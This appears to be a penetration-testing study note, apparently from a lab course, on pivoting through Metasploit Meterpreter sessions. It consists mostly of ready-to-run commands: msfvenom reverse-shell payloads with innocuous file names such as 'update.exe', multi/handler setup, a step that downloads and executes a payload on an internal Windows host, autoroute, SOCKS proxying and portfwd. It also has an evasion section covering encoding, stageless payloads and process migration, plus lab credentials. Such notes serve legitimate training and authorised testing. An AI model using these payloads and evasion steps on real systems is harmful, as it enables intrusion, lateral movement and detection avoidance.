# Meterpreter Tunneling & Port Forwarding

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[Remote-Reverse Port Forwarding with SSH|SSH Reverse Forward]], [[SOCKS5 Tunneling with Chisel|Chisel]]

---

## Overview

Metasploit's Meterpreter provides built-in pivoting capabilities through autoroute, portfwd, and SOCKS proxy modules. Essential for Metasploit-centric operations where you already have a Meterpreter session.

**Key Features:**
- autoroute: Route traffic through Meterpreter session
- portfwd: Forward ports (local and reverse)
- SOCKS proxy: Create SOCKS4a proxy
- Integrated with MSF modules

**Use Cases:**
- Already have Meterpreter session
- Need to use MSF modules against internal network
- Want all-in-one MSF solution
- Pivoting without additional tools

---

## Initial Setup

### Step 1: Create Meterpreter Payload for Pivot

```bash
# Linux pivot host
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.18 \
  LPORT=8080 \
  -f elf \
  -o backupjob

# Windows pivot host
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.18 \
  LPORT=8080 \
  -f exe \
  -o update.exe
```

### Step 2: Setup Metasploit Handler

```bash
msfconsole -q

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
set ExitOnSession false
exploit -j
```

### Step 3: Execute Payload on Pivot

```bash
# Transfer and execute
scp backupjob ubuntu@10.129.202.64:~/
# On pivot: chmod +x backupjob && ./backupjob

# Result:
[*] Meterpreter session 1 opened
meterpreter >
```

---

## Network Enumeration Through Pivot

### Ping Sweep Methods

#### Method 1: Metasploit Module
```bash
background
use post/multi/gather/ping_sweep
set RHOSTS 172.16.5.0/23
set SESSION 1
run
```

#### Method 2: Bash One-liner (Linux Pivot)
```bash
shell
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

#### Method 3: CMD One-liner (Windows Pivot)
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Method 4: PowerShell One-liner
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

---

## SOCKS Proxy Pivoting

### Step 1: Setup SOCKS Proxy Server

```bash
# Background session
background

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run -j
```

### Step 2: Add Routes with Autoroute

```bash
# Method 1: Post module
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK /23
run

# Method 2: Direct command
sessions -i 1
run autoroute -s 172.16.5.0/23

# Verify routes
run autoroute -p
```

### Step 3: Configure Proxychains

```bash
# /etc/proxychains.conf
[ProxyList]
socks4a 127.0.0.1 9050
```

### Step 4: Enumerate Through Proxy

```bash
# Port scanning
proxychains nmap -sT -Pn -p3389 172.16.5.19

# Metasploit modules (no proxychains needed)
use auxiliary/scanner/smb/smb_version
set RHOSTS 172.16.5.0/24
run

# RDP connection
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Port Forwarding with Meterpreter

### Local Port Forwarding

```bash
# Forward RDP
portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Access forwarded port
xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# List forwards
portfwd list

# Remove forward
portfwd delete -l 3300
```

**Parameters:**
- `-l`: Local port on attack machine
- `-p`: Remote port on target
- `-r`: Target IP

### Reverse Port Forwarding

Used to catch reverse shells from internal targets.

#### Setup
```bash
# In meterpreter session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

**Parameters:**
- `-R`: Reverse forward
- `-l 8081`: Port on attack machine
- `-p 1234`: Port on pivot
- `-L 10.10.14.18`: Attack machine IP

#### Create Handler for Reverse Shell
```bash
# Setup handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
exploit -j
```

#### Generate Payload for Internal Target
```bash
# Payload connects to pivot, forwards to you
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.5.129 \
  LPORT=1234 \
  -f exe \
  -o backupscript.exe
```

#### Deploy and Execute
```bash
# Host on pivot
python3 -m http.server 8123

# On Windows target
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
C:\backupscript.exe

# Shell caught through reverse tunnel
[*] Meterpreter session 2 opened
```

---

## Understanding the Traffic Flow

### SOCKS Proxy + Autoroute Flow

```
Attack Machine → Proxychains → SOCKS Proxy (127.0.0.1:9050)
    ↓
Metasploit Framework
    ↓
Autoroute (checks routes)
    ↓
Meterpreter Session (encrypted tunnel)
    ↓
Pivot Host
    ↓
Internal Target (172.16.5.19)
```

**What Each Component Does:**

1. **Proxychains**: Forces application traffic through SOCKS proxy
2. **SOCKS Proxy**: Receives traffic on 127.0.0.1:9050, hands to Metasploit
3. **Autoroute**: Routes matching traffic through correct Meterpreter session
4. **Meterpreter**: Tunnels traffic to pivot host
5. **Pivot Host**: Forwards to final destination

### Why All Three Are Needed

**Autoroute Alone:**
- Only routes Metasploit module traffic
- External tools (nmap, xfreerdp) won't work

**SOCKS Proxy Alone:**
- No routes configured
- Doesn't know which Meterpreter session to use

**Autoroute + SOCKS Proxy:**
- SOCKS proxy accepts traffic from proxychains
- Autoroute routes traffic through correct session
- Complete solution for all tools

---

## Advanced Techniques

### Multiple Network Pivoting

```bash
# Session 1: First pivot
sessions -i 1
run autoroute -s 172.16.5.0/23

# Session 2: Second pivot (deeper in network)
sessions -i 2
run autoroute -s 10.10.10.0/24

# Both networks accessible through single SOCKS proxy
```

### Multi-Session Port Forwarding

```bash
# Forward from different internal networks
sessions -i 1
portfwd add -l 3301 -p 3389 -r 172.16.5.19

sessions -i 2
portfwd add -l 3302 -p 3389 -r 10.10.10.50

# Access both via different local ports
```

### Persistent Pivoting

```bash
# Save routes in resource script
echo "use post/multi/manage/autoroute" > pivot.rc
echo "set SESSION 1" >> pivot.rc
echo "set SUBNET 172.16.5.0/23" >> pivot.rc
echo "run" >> pivot.rc

# Load on reconnect
msfconsole -r pivot.rc
```

---

## Troubleshooting

### Autoroute Not Working

```bash
# Verify route added
run autoroute -p

# Check session is alive
sessions -l

# Re-add route if needed
run autoroute -s 172.16.5.0/23

# Flush and re-add
run autoroute -d 172.16.5.0
run autoroute -s 172.16.5.0/23
```

### SOCKS Proxy Issues

```bash
# Verify proxy running
jobs -l

# Check port listening
netstat -tulpn | grep 9050

# Restart SOCKS proxy
jobs -k [job_id]
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

### Proxychains Not Working

```bash
# Test proxychains config
proxychains4 curl http://172.16.5.19

# Verify correct SOCKS version
# Must use socks4a for Metasploit
cat /etc/proxychains.conf | grep socks

# Debug mode
proxychains4 -f /etc/proxychains.conf -v nmap 172.16.5.19
```

### Port Forward Fails

```bash
# Check if port already in use
netstat -tulpn | grep 3300

# Kill conflicting process
fuser -k 3300/tcp

# Verify meterpreter session active
sessions -i 1
sysinfo

# Re-add port forward
portfwd delete -l 3300
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

---

## Performance Optimization

### Improve SOCKS Proxy Speed

```bash
# Increase threads
set THREADS 10

# Disable logging
set VERBOSE false
```

### Faster Network Scans

```bash
# Use Metasploit modules (faster than proxychains+nmap)
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.0/24
set PORTS 80,443,445,3389
set THREADS 50
run
```

### Reduce Latency

```bash
# Use portfwd instead of SOCKS when possible
# Direct port forward = faster than proxy routing
portfwd add -l 3389 -p 3389 -r 172.16.5.19
xfreerdp /v:localhost:3389  # Faster than proxychains
```

---

## Comparison with Other Methods

| Feature | Meterpreter | [[SSH Socks Tunnel PF\|SSH]] | [[SOCKS5 Tunneling with Chisel\|Chisel]] |
|---------|-------------|-----|---------|
| Speed | Slow | Fast | Medium |
| Stealth | Low (AV) | High | Medium |
| Setup | Easy (MSF) | Easy | Easy |
| Requirements | Meterpreter | SSH access | HTTP egress |
| MSF Integration | Native | Proxychains | Proxychains |
| Stability | Medium | High | High |

**Use Meterpreter When:**
- Already have Meterpreter session
- Using Metasploit modules extensively
- Don't want additional binaries
- Need MSF-native pivoting

**Use Alternatives:**
- [[SSH Socks Tunnel PF|SSH]]: Want speed and stealth, have SSH access
- [[SOCKS5 Tunneling with Chisel|Chisel]]: SSH blocked, need HTTP tunnel
- [[Remote-Reverse Port Forwarding with SSH|SSH Reverse]]: Specific port forward needed

---

## Operational Security

### Detection Indicators
- Meterpreter payload on disk/memory
- Unusual Metasploit framework signatures
- Encrypted traffic to known C2 IPs
- Reverse TCP connections
- Suspicious process behavior

### Evasion Techniques
```bash
# Use stageless payload (no second connection)
msfvenom -p windows/x64/meterpreter_reverse_tcp ...

# Use HTTPS for encryption
set payload windows/x64/meterpreter/reverse_https

# Encode payload
msfvenom -p ... -e x64/xor_dynamic -i 3

# Migrate to legitimate process
meterpreter > migrate [pid]
```

---

## Quick Reference

```bash
# Initial setup
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o payload
use exploit/multi/handler && set payload && exploit -j

# SOCKS pivoting
use auxiliary/server/socks_proxy
set SRVPORT 9050 && run -j
run autoroute -s 172.16.5.0/23

# Proxychains config
echo "socks4a 127.0.0.1 9050" >> /etc/proxychains.conf

# Port forwarding
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r TARGET_IP
portfwd add -R -l ATTACK_PORT -p PIVOT_PORT -L ATTACK_IP

# Management
autoroute -p                    # View routes
portfwd list                    # View forwards
sessions -l                     # List sessions
jobs -l                         # List jobs
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[SSH Socks Tunnel PF|SSH Dynamic SOCKS Tunnel]]
- [[Remote-Reverse Port Forwarding with SSH|SSH Reverse Port Forwarding]]
- [[SOCKS5 Tunneling with Chisel|Chisel SOCKS5 Tunneling]]

**Tags:** #meterpreter #metasploit #autoroute #portfwd #socks-proxy #pivoting #post-exploitation